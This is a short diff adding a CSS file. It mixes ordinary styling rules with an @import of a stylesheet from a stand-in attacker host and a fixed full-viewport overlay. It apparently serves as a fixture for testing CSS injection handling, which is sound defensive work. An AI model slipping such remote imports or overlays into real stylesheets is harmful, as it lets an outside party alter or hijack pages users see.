@@ -1,0 +1,5 @@
+.mdd-note { color: #2f5d50; font-weight: 600; }
+.mdd-highlight { background-color: #f8efbf; }
+.mdd-badge { background-image: url('sample.png'); background-size: 2px 2px; }
+@import url('https://attacker.invalid/remote.css');
+#outside { position: fixed; inset: 0; }
